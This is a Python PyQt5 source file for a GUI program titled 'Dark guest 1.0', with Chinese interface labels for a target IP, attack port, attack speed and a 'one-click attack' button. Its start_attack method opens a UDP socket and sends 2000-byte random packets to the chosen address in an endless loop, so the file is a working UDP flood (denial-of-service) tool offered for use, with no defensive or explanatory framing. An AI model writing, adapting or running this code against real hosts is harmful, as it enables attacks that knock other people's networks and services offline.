# -*- coding: utf-8 -*-
import sys
import socket
import random
import time
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import QMessageBox


class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.setWindowIcon(QIcon('logo.ico'))
        MainWindow.setFixedSize(876, 531)
        MainWindow.setStyleSheet("background-color: rgb(85, 85, 127);")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(640, 100, 221, 41))
        self.pushButton.setStyleSheet("background-color: rgb(99, 148, 148);")
        self.pushButton.setObjectName("pushButton")
        self.pushButton_2 = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton_2.setGeometry(QtCore.QRect(710, 10, 151, 31))
        self.pushButton_2.setStyleSheet("background-color: rgb(0, 0, 0);\n"
"color: rgb(255, 255, 255);")
        self.pushButton_2.setObjectName("pushButton_2")
        self.lineEdit = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(50, 100, 551, 41))
        self.lineEdit.setStyleSheet("\n"
"color: rgb(85, 255, 127);")
        self.lineEdit.setText("")
        self.lineEdit.setObjectName("lineEdit")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(50, 60, 201, 31))
        font = QtGui.QFont()
        font.setPointSize(14)
        self.label.setFont(font)
        self.label.setStyleSheet("color: rgb(255, 255, 255);")
        self.label.setObjectName("label")
        self.progressBar = QtWidgets.QProgressBar(self.centralwidget)
        self.progressBar.setGeometry(QtCore.QRect(50, 470, 801, 41))
        self.progressBar.setProperty("value", 0)
        self.progressBar.setObjectName("progressBar")
        self.lineEdit_2 = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_2.setGeometry(QtCore.QRect(600, 180, 201, 41))
        self.lineEdit_2.setStyleSheet("\n"
"color: rgb(85, 255, 127);")
        self.lineEdit_2.setText("")
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.label_2 = QtWidgets.QLabel(self.centralwidget)
        self.label_2.setGeometry(QtCore.QRect(470, 180, 121, 31))
        font = QtGui.QFont()
        font.setPointSize(14)
        self.label_2.setFont(font)
        self.label_2.setStyleSheet("color: rgb(255, 255, 255);")
        self.label_2.setObjectName("label_2")
        self.lineEdit_3 = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_3.setGeometry(QtCore.QRect(180, 180, 201, 41))
        self.lineEdit_3.setStyleSheet("\n"
"color: rgb(85, 255, 127);")
        self.lineEdit_3.setText("")
        self.lineEdit_3.setObjectName("lineEdit_3")
        self.label_3 = QtWidgets.QLabel(self.centralwidget)
        self.label_3.setGeometry(QtCore.QRect(50, 180, 121, 31))
        font = QtGui.QFont()
        font.setPointSize(14)
        self.label_3.setFont(font)
        self.label_3.setStyleSheet("color: rgb(255, 255, 255);")
        self.label_3.setObjectName("label_3")
        self.textBrowser = QtWidgets.QTextBrowser(self.centralwidget)
        self.textBrowser.setGeometry(QtCore.QRect(40, 241, 811, 211))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.textBrowser.setFont(font)
        self.textBrowser.setStyleSheet("color: rgb(85, 255, 127);")
        self.textBrowser.setObjectName("textBrowser")
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)
        """
        将按钮的点击事件与下面另一个指定的函数连接起来
        """
        self.pushButton.clicked.connect(self.start_attack)
        self.pushButton_2.clicked.connect(self.open_filr)
    def retranslateUi(self, MainWindow):               # 定义retranslateUi的方法，用于设置UI界面的文本内容
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "Dark guest 1.0"))
        self.pushButton.setText(_translate("MainWindow", "一键攻击"))
        self.pushButton_2.setText(_translate("MainWindow", "关于我们"))
        self.label.setText(_translate("MainWindow", "目标IP："))
        self.label_2.setText(_translate("MainWindow", "攻击速度："))
        self.label_3.setText(_translate("MainWindow", "攻击端口："))
        self.textBrowser.setHtml(_translate("MainWindow", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:10pt; font-weight:400; font-style:normal;\">\n"
"<p style=\"-qt-paragraph-type:empty; margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\"><br /></p></body></html>"))
    def start_attack(self):                 # 定义set_icon_path的方法
            #从lineEdit文本框控件中获取目标IP地址、端口号和攻击速度
            ip = self.lineEdit.text()
            port = int(self.lineEdit_3.text())
            speed = int(self.lineEdit_2.text())
            #创建一个UDP并生成了一个大小为2000字节的随机数据包
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(2000)
            sent = 0
            while True:
                sock.sendto(bytes, (ip, port))#随机生成的数据包发送到指定的IP地址和端口号
                sent += 1
                self.textBrowser.append(f"攻击中...  已发送{sent}数据包到{ip}端口{port}下")#在文本控件中显示攻击进度
                self.progressBar.setValue(sent)
                time.sleep((1000 - speed) / 2000)           #根据攻击速度设置每次发送之间的时间间隔
    def open_filr(self):
        QMessageBox.information(None, "关于我们", "e")
if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
